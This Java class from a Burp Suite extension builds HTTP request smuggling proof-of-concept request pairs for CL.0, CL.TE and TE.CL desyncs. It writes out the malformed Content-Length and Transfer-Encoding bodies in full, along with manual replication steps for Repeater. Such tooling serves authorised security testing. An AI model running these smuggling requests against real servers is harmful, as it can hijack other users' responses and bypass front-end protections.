package burp;

import java.nio.charset.StandardCharsets;

/**
 * Builds a deterministic, human-runnable desync proof-of-concept from an original
 * request, tailored to the specific desync class (CL.0, CL.TE or TE.CL).
 *
 * <p>The output is a pair of requests meant to be sent on a single connection in
 * Burp Repeater via "Send group in sequence (single connection)". Each class needs
 * a different request shape <em>and</em> a different "Update Content-Length"
 * setting, which is exactly what people get wrong by hand — so the type drives both
 * the bytes and the instructions.</p>
 */
final class DesyncRepro {

    enum Type {
        CL_0("CL.0"),
        CL_TE("CL.TE"),
        TE_CL("TE.CL"),
        UNKNOWN("Unknown");

        final String label;

        Type(String label) {
            this.label = label;
        }
    }

    static final String DEFAULT_SMUGGLED_LINE = "GET /favicon.ico HTTP/1.1";
    static final String DEFAULT_TECHNIQUE = "vanilla";

    final byte[] attackRequest;
    final byte[] followUpRequest;
    final String smuggledLine;
    final String technique;
    final Type type;
    /** Whether Burp Repeater's "Update Content-Length" should stay enabled for this PoC. */
    final boolean keepUpdateContentLength;

    private DesyncRepro(byte[] attackRequest, byte[] followUpRequest, String smuggledLine,
                        String technique, Type type, boolean keepUpdateContentLength) {
        this.attackRequest = attackRequest;
        this.followUpRequest = followUpRequest;
        this.smuggledLine = smuggledLine;
        this.technique = technique;
        this.type = type;
        this.keepUpdateContentLength = keepUpdateContentLength;
    }

    static DesyncRepro build(Type type, byte[] baseReq, String smuggledLine, String technique) {
        if (smuggledLine == null || smuggledLine.trim().isEmpty()) {
            smuggledLine = DEFAULT_SMUGGLED_LINE;
        }
        smuggledLine = smuggledLine.trim();
        if (type == null) {
            type = Type.CL_0;
        }
        switch (type) {
            case CL_TE:
                return clTe(baseReq, smuggledLine);
            case TE_CL:
                return teCl(baseReq, smuggledLine);
            case CL_0:
            case UNKNOWN:
            default:
                return clZero(baseReq, smuggledLine, technique, type);
        }
    }

    private static byte[] prep(byte[] base) {
        byte[] req = SmuggleScanBox.setupRequest(base);
        // The repro is sent over HTTP/1.1 on a single keep-alive connection.
        req = Utilities.replaceFirst(req, " HTTP/2\r\n", " HTTP/1.1\r\n");
        req = Utilities.addOrReplaceHeader(req, "Connection", "keep-alive");
        return req;
    }

    private static DesyncRepro clZero(byte[] baseReq, String smuggledLine, String technique, Type type) {
        if (technique == null || technique.trim().isEmpty()) {
            technique = DEFAULT_TECHNIQUE;
        }
        technique = technique.trim();

        byte[] req = prep(baseReq);
        // The smuggled prefix ends in a dangling header name so the follow-up's
        // request line gets swallowed as its value, leaving the smuggled request as
        // the one the back-end answers once it ignores our Content-Length.
        String smuggle = smuggledLine + "\r\nX-Smuggle-Probe: ";
        byte[] attack = Utilities.setBody(req, smuggle);
        attack = Utilities.fixContentLength(attack);
        if (!DEFAULT_TECHNIQUE.equals(technique)) {
            try {
                byte[] mangled = DesyncBox.applyDesync(attack, "Content-Length", technique);
                if (mangled != null) {
                    attack = mangled;
                }
            } catch (Throwable ignored) {
                technique = DEFAULT_TECHNIQUE;
            }
        }
        return new DesyncRepro(attack, buildFollowUp(baseReq), smuggledLine, technique,
                type == Type.UNKNOWN ? Type.UNKNOWN : Type.CL_0, true);
    }

    private static DesyncRepro clTe(byte[] baseReq, String smuggledLine) {
        byte[] req = prep(baseReq);
        req = Utilities.addOrReplaceHeader(req, "Transfer-Encoding", "chunked");
        // Front-end honours Content-Length and forwards the whole body; the back-end
        // honours Transfer-Encoding, sees the terminating 0-chunk and treats the rest
        // (our smuggled prefix) as the start of the next request.
        String body = "0\r\n\r\n" + smuggledLine + "\r\nX-Smuggle-Probe: ";
        byte[] attack = Utilities.setBody(req, body);
        attack = Utilities.fixContentLength(attack);
        return new DesyncRepro(attack, buildFollowUp(baseReq), smuggledLine, DEFAULT_TECHNIQUE,
                Type.CL_TE, true);
    }

    private static DesyncRepro teCl(byte[] baseReq, String smuggledLine) {
        byte[] req = prep(baseReq);
        req = Utilities.addOrReplaceHeader(req, "Transfer-Encoding", "chunked");
        // Front-end honours Transfer-Encoding and reads the whole chunked body; the
        // back-end honours Content-Length and reads only the chunk-size line, so the
        // chunk data is parsed as a fresh (smuggled) request.
        String chunkData = smuggledLine + "\r\nX-Smuggle-Probe: x";
        int dataLen = chunkData.getBytes(StandardCharsets.ISO_8859_1).length;
        String hex = Integer.toHexString(dataLen);
        String body = hex + "\r\n" + chunkData + "\r\n0\r\n\r\n";
        byte[] attack = Utilities.setBody(req, body);
        // Content-Length must cover ONLY the chunk-size line; do not auto-fix it.
        int cl = (hex + "\r\n").getBytes(StandardCharsets.ISO_8859_1).length;
        attack = Utilities.addOrReplaceHeader(attack, "Content-Length", String.valueOf(cl));
        return new DesyncRepro(attack, buildFollowUp(baseReq), smuggledLine, DEFAULT_TECHNIQUE,
                Type.TE_CL, false);
    }

    private static byte[] buildFollowUp(byte[] baseReq) {
        byte[] follow = Utilities.replaceFirst(baseReq, " HTTP/2\r\n", " HTTP/1.1\r\n");
        follow = Utilities.addOrReplaceHeader(follow, "Connection", "keep-alive");
        // A clean, body-less request: if the back-end desynced, this read returns the
        // smuggled request's response instead of its own. We deliberately do NOT add a
        // Transfer-Encoding header here — a non-standard request TE (e.g. "identity")
        // makes some front-ends/CDNs reset the connection, which masquerades as the
        // target being unreachable.
        follow = Utilities.setBody(follow, "");
        follow = Utilities.fixContentLength(follow);
        return follow;
    }

    /** Best-effort detection of the desync class from a finding's title/detail text. */
    static Type typeFromText(String text) {
        if (text == null) {
            return null;
        }
        String t = text.toUpperCase(java.util.Locale.ROOT);
        if (t.contains("CL.0") || t.contains("0.CL")) {
            return Type.CL_0;
        }
        if (t.contains("CL.TE")) {
            return Type.CL_TE;
        }
        if (t.contains("TE.CL")) {
            return Type.TE_CL;
        }
        return null;
    }

    /** Coarse fallback when no finding text is available: infer from the request shape. */
    static Type typeFromRequest(byte[] requestBytes) {
        try {
            String headers = Utils.getHeaders(
                    new String(requestBytes, StandardCharsets.ISO_8859_1)).toLowerCase(java.util.Locale.ROOT);
            if (headers.contains("transfer-encoding") || headers.contains("chunked")) {
                // Chunked requests are ambiguous between CL.TE and TE.CL; CL.TE is the
                // more common finding, and the user can override in the UI.
                return Type.CL_TE;
            }
        } catch (Throwable ignored) {
            // fall through
        }
        return Type.CL_0;
    }

    /** Step-by-step manual replication guidance tailored to the type. */
    String instructions() {
        StringBuilder sb = new StringBuilder();
        sb.append(type.label).append(" desync — manual replication in Burp Repeater\n");
        sb.append("==================================================\n\n");
        sb.append("Why it is fiddly by hand: this desync only shows up when two requests travel\n");
        sb.append("down the SAME TCP/TLS connection and the front-end and back-end disagree about\n");
        sb.append("where the first request's body ends. Sending the requests separately, or letting\n");
        sb.append("Burp open a fresh connection, hides the bug entirely.\n\n");
        sb.append(typeExplanation());
        sb.append("\nSteps:\n");
        sb.append("  1. Click \"Send both to Repeater\". Two tabs are created:\n");
        sb.append("       #1  ").append(type.label).append(" attack   (the request that desyncs the connection)\n");
        sb.append("       #2  follow-up           (an innocent request)\n");
        sb.append("  2. Select BOTH tabs, right-click > \"Add tab to group\" and create a group.\n");
        sb.append("  3. Open the Send button drop-down and choose\n");
        sb.append("       \"Send group in sequence (single connection)\".\n");
        if (keepUpdateContentLength) {
            sb.append("  4. Leave \"Update Content-Length\" ENABLED for this type.\n");
        } else {
            sb.append("  4. IMPORTANT: turn \"Update Content-Length\" OFF (the Content-Length is\n");
            sb.append("     deliberately short; Burp would otherwise rewrite it and break the PoC).\n");
        }
        sb.append("  5. Read the response shown for tab #2 (the follow-up). If the target is\n");
        sb.append("     vulnerable, that response is actually the answer to the SMUGGLED request\n");
        sb.append("     (").append(smuggledLine).append("), not the follow-up's own resource.\n\n");
        sb.append("If it does not trigger:\n");
        sb.append("  - Re-send the group a few times; desyncs are often intermittent.\n");
        sb.append("  - Confirm \"Send group in sequence (single connection)\".\n");
        sb.append("  - Make sure the session/cookie is still valid (use \"Validate session\" above).\n");
        sb.append("  - Change the smuggled request line so its response clearly differs from the\n");
        sb.append("    follow-up's normal response (e.g. a 404 path or /robots.txt).\n");
        if (type == Type.UNKNOWN) {
            sb.append("  - The desync class could not be determined automatically; try the other\n");
            sb.append("    types from the drop-down above.\n");
        }
        return sb.toString();
    }

    private String typeExplanation() {
        switch (type) {
            case CL_TE:
                return "CL.TE: the front-end uses Content-Length (forwards the whole body) but the\n"
                        + "back-end uses Transfer-Encoding (stops at the 0-chunk), leaving your smuggled\n"
                        + "prefix at the front of the next request.\n";
            case TE_CL:
                return "TE.CL: the front-end uses Transfer-Encoding (reads the whole chunked body) but\n"
                        + "the back-end uses Content-Length (reads only the chunk-size line), so the chunk\n"
                        + "data is parsed as a separate smuggled request.\n";
            case CL_0:
                return "CL.0: the front-end honours Content-Length but the back-end ignores it (treats\n"
                        + "it as 0), so the declared body is parsed as the start of the next request.\n";
            default:
                return "Desync class undetermined; this PoC defaults to the CL.0 shape.\n";
        }
    }
}
